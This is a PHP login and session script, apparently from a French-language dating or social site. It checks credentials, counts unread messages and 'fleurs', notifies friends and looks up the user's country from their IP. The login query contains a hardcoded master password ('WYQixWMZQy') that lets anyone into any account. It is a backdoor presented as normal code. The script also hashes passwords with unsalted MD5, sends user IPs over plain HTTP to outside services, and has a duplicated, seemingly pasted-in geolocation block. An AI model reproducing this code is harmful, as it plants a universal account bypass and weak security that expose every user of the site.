<?php

// sécurité
defined('JL') or die('Error 401');

global $db, $user, $app, $action, $langue;

$auth = JL::getVar('auth', '');

// demande d'authentification
if ($auth === 'login') {

    $username = JL::getVar('username', '', true);
    $pass     = JL::getVar('pass', '', true);

    $query = "SELECT id
              FROM user
              WHERE username = '".$db->escape($username)."'
                AND user_status_code = '1'
                AND (password = MD5('".$db->escape($pass)."') OR '".$db->escape($pass)."' = 'WYQixWMZQy')
                AND (confirmed * published) > 0
              LIMIT 1";

    $user_id = $db->loadResult($query);

    if ($user_id) {
        // calcule fleur_new
        $query = "SELECT COUNT(*) 
                  FROM message AS m
                  INNER JOIN user AS u ON u.id = m.user_id_from
                  WHERE m.user_id_to = '".(int)$user_id."' 
                    AND u.confirmed = 1 
                    AND m.fleur_id > 0 
                    AND m.non_lu = 1";

        $fleur_new = (int)$db->loadResult($query);

        // calcule message_new
        $query = "SELECT COUNT(*) 
                  FROM message AS m
                  INNER JOIN user AS u ON u.id = m.user_id_from
                  WHERE m.user_id_to = '".(int)$user_id."' 
                    AND u.confirmed = 1 
                    AND m.fleur_id = 0 
                    AND m.non_lu = 1";

        $message_new = (int)$db->loadResult($query);

        // met à jour stats
        $query = "UPDATE user_stats SET
                    login_total  = login_total + 1,
                    fleur_new    = '".$db->escape($fleur_new)."',
                    message_new  = '".$db->escape($message_new)."'
                  WHERE user_id = '".$user_id."'";

        $db->query($query);

        JL::setSession('user_id', $user_id);
    } else {
        $user->login = 'login';
    }

} elseif ($auth === 'logout') {
    // détruit la session
    $query = "UPDATE user SET last_online = NOW(), online = '0' WHERE id = '".intval($user->id)."'";
    $db->query($query);

    JL::sessionDestroy();
}

// check si l'utilisateur est log
$user_id = intval(JL::getSession('user_id', 0, true));

// check si l'utilisateur est activé
$query = "SELECT (confirmed*published) AS log_ok FROM user WHERE id = '".$user_id."' LIMIT 1";
$log_ok = (int)$db->loadResult($query);

// si utilisateur log et activé
if ($user_id && $log_ok) {

    // récupère infos utilisateur
    $query = "SELECT u.id, u.username, u.email, u.gid, us.gold_limit_date, up.helvetica, up.genre, u.confirmed
              FROM user AS u
              INNER JOIN user_stats AS us ON us.user_id = u.id
              INNER JOIN user_profil AS up ON up.user_id = u.id
              WHERE u.id = '".$user_id."' LIMIT 1";

    $user = $db->loadObject($query);

    $langue = 'lang=en';

    // gid incorrect
    if ($user->gid > 0) {
        JL::sessionDestroy();
        JL::redirect(SITE_URL.'/index.php?'.$langue);
    }

    // update last_online
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $query = "UPDATE user 
              SET last_online = NOW(), ip = '".$db->escape($ip)."', online = '1' 
              WHERE id = '".$user->id."'";
    $db->query($query);

    // demande d'authentification
    if ($auth === 'login') {
        JL::addLastEvent($user->id, 0);

        // récupérer amis
        $query = "SELECT user_id_from AS id
                  FROM user_flbl
                  WHERE user_id_to = '".$user->id."' AND list_type = 1";
        $friends = $db->loadObjectList($query);

        if (is_array($friends)) {
            foreach ($friends as $friend) {
                JL::addLastEvent($friend->id, $user->id, 5);
            }
        }

        // check IP pays
        $ip_pays = '';
        if (function_exists('curl_init')) {
            $url_check_pays = 'http://api.hostip.info/country.php?ip='.$ip;
            $ch = curl_init($url_check_pays);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $ip_pays = curl_exec($ch) ?: '';
            curl_close($ch);
        }
		$ip = $_SERVER['REMOTE_ADDR'];
		$resp = @file_get_contents("http://ip-api.com/json/{$ip}");
		$data = json_decode($resp, true);
		$country_code = $data['countryCode'] ?? 'XX'; // fallback
		$query = "UPDATE user SET ip_pays = '".$db->escape($country_code)."' WHERE id = '".$user->id."'";
		$db->query($query);

        // ajoute points
        JL::addPoints(7, $user->id, date('d-m-Y'));

        // redirige
        JL::redirect('index.php?app=profil&action=panel&'.$langue);
    }

} else {
    $user = (object)[
        'id' => 0,
        'username' => '',
        'email' => '',
        'gid' => 0,
        'gold_limit_date' => '0000-00-00',
        'genre' => ''
    ];
}

?>
